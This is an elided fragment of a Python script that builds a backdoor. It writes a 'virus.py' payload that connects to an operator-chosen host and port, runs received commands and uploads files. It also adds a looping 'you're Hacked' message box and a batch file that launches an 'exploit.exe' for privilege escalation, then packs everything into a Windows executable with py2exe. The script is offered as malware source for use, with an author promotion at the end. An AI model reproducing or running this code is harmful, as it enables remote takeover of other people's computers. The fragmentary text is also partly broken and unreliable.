...
try:
    ...
    print(' [-] Error! Please specify the HOST and PORT')
    print(' Usage: python '+MyName+' [HOST] [PORT]')
    print(' EXAMPLE: python '+ MyName+ ' 127.0.0.1 8080')
    quit()
...
def Texter(LOOP=False, TEXT="LOL! you\\\'re Hacked!", ICON=1, TITLE=\'HACKED\'):
    code = \'\'\'do
x=msgbox(\'\'\'+TEXT+\', \'+ICON+\', \'+ TITLE +\'\'\')
loop\'\'\'
    open(\'temp.vbs\', \'w\').write(code).close()

def privilegeEscalation(FILENAME):
    bat="""
@echo off
rename exploit.dll explot.exe
ping localhost -n 1
exploit.exe 31 """
    bat += FILENAME
    batchFile = open(\'Xploit.bat\', \'w\')
    batchFile.write(bat)
    batchFile.close()
    os.system(\'start Xploit.bat\')
    ...
    while True:
            ...
            if command == \'upload\':
                ...
                if op == \'\':
                    ...
                    c.sendall(op)
'''
virus=open('virus.py', 'w').write(code+'\nHOST=\''+HOST+'\'\nPORT='+str(PORT)+'\nif __name__==\'__msin__\':\n    main()')
code='''
from distutils.core import setup
import py2exe
setup(console=[\'virus.py\'])
'''
setu=open('setup.py', 'w')
setu.write(code)
setu.close()
os.system('python setup.py install py2exe')
os.system('cls')
print('''
........................................
........................................
...
........................................
    ...
    Follow me
    Instagram..................: https://www.Instagram.com/the_black_eyed_duke
